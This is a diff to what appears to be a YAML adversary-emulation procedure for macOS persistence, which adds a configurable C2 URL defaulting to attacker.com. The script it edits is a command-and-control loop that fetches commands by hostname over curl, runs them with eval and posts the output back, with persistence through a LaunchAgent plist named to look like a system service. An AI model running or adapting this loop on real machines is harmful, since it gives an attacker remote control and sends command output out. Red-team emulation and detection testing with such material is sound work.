@@ -27,6 +27,10 @@ args:
   description: Path to loader plist
   type: string
   default: ~/Library/LaunchAgents/com.system.services.loader.plist
+- name: c2_url
+  description: C2 server base URL for command and control
+  type: string
+  default: http://attacker.com
 steps:
 - name: create_app_support_directory
   inline: mkdir -p {{ .Args.app_support_dir }}
@@ -46,10 +50,10 @@ steps:
     # Establish reverse shell or C2 connection
     while true; do
       # Attempt to connect to command server
-      COMMAND=$(curl -s "http://attacker.com/getcommand?id=$(hostname)" 2>/dev/null)
+      COMMAND=$(curl -s "{{ .Args.c2_url }}/getcommand?id=$(hostname)" 2>/dev/null)
       if [ ! -z "$COMMAND" ]; then
         OUTPUT=$(eval "$COMMAND" 2>&1)
-        curl -s -X POST -d "output=$OUTPUT" "http://attacker.com/sendoutput" 2>/dev/null
+        curl -s -X POST -d "output=$OUTPUT" "{{ .Args.c2_url }}/sendoutput" 2>/dev/null
       fi
       sleep 300
     done
